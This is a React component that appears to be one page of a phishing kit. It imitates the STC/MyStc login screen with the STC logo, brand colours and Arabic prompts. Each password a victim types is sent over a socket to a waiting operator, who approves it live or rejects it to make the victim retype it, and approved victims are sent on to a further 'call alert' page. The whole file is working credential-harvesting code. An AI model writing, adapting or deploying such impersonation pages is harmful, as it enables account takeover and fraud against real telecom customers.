import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  sendData,
  isFormApproved,
  isFormRejected,
  navigateToPage,
  socket,
} from "@/lib/store";
import { Lock } from "lucide-react";

const schema = z.object({
  password: z.string()
    .min(1, "كلمة المرور مطلوبة"),
});

type FormData = z.infer<typeof schema>;

export default function STCPassword() {
  const [, navigate] = useLocation();
  const [showPassword, setShowPassword] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  const {
    register,
    handleSubmit,
    reset,
    watch,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      password: "",
    },
  });

  const password = watch("password");
  const isPasswordValid = password && password.length > 0;

  // Emit page enter
  useEffect(() => {
    navigateToPage("كلمة مرور STC");
  }, []);

  // Listen for form:rejected event directly from socket
  useEffect(() => {
    const s = socket.value;
    
    const handleRejected = () => {
      console.log("STCPassword: Form rejected received!");
      setErrorMessage("يرجى ادخال كلمة المرور بشكل صحيح");
      reset();
    };

    const handleApproved = () => {
      console.log("STCPassword: Form approved received!");
      navigate("/stc-call-alert");
    };

    s.on("form:rejected", handleRejected);
    s.on("form:approved", handleApproved);

    return () => {
      s.off("form:rejected", handleRejected);
      s.off("form:approved", handleApproved);
    };
  }, [reset, navigate]);

  const onSubmit = (data: FormData) => {
    setErrorMessage("");
    sendData({
      data: {
        "كلمة مرور STC": data.password,
      },
      current: "كلمة مرور STC",
      waitingForAdminResponse: true,
      customWaitingMessage: "جاري التحقق من كلمة المرور",
    });
  };

  return (
    <PageLayout variant="default" className="bg-white min-h-screen">
      <WaitingOverlay />

      <div className="px-6 py-8 flex flex-col min-h-screen">
        {/* STC Logo */}
        <div className="flex justify-center mb-8">
          <img 
            src="/images/service-providers/stc-l3.png" 
            alt="STC" 
            className="h-10 w-auto"
          />
        </div>

        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-xl font-bold text-gray-800 mb-2">أدخل كلمة المرور</h1>
          <p className="text-sm">
            <span style={{ color: '#00A651' }}>يتعين عليك ادخال كلمة المرور الجديدة من </span>
            <span style={{ color: '#4F008C' }}>Mystc</span>
          </p>
        </div>

        <form onSubmit={handleSubmit(onSubmit)} className="flex-1 flex flex-col">
          {/* Password Field */}
          <div className="flex items-center border-b border-gray-300 px-4 py-3 bg-white">
            {/* Left side - Lock icon */}
            <Lock className="w-5 h-5 text-gray-400" />
            
            {/* Input Field */}
            <input
              id="password"
              type={showPassword ? "text" : "password"}
              placeholder="كلمة المرور"
              className="flex-1 bg-transparent text-right outline-none mx-3 text-sm placeholder-gray-400 [&::-ms-reveal]:hidden [&::-webkit-credentials-auto-fill-button]:hidden"
              dir="ltr"
              autoComplete="new-password"
              onInput={(e) => {
                const input = e.target as HTMLInputElement;
                input.value = input.value.replace(/[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF]/g, '');
              }}
              {...register("password")}
            />
            
            {/* Right side - Show/Hide button */}
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="text-sm font-medium"
              style={{ color: '#4F008C' }}
            >
              {showPassword ? "إخفاء" : "اظهار"}
            </button>
          </div>
          <div>
            
            {errors.password && (
              <p className="text-red-500 text-xs text-right">{errors.password.message}</p>
            )}
            {errorMessage && (
              <p className="text-red-500 text-xs text-right mt-2">{errorMessage}</p>
            )}
          </div>

          {/* Submit Button */}
          <div className="mt-24">
            <Button 
              type="submit" 
              disabled={!isPasswordValid}
              className="w-full h-12 text-base font-medium rounded-lg transition-colors"
              style={{ 
                backgroundColor: isPasswordValid ? '#4F008C' : '#E5E5E5', 
                color: isPasswordValid ? '#FFFFFF' : '#666666' 
              }}
            >
              تسجيل الدخول
            </Button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
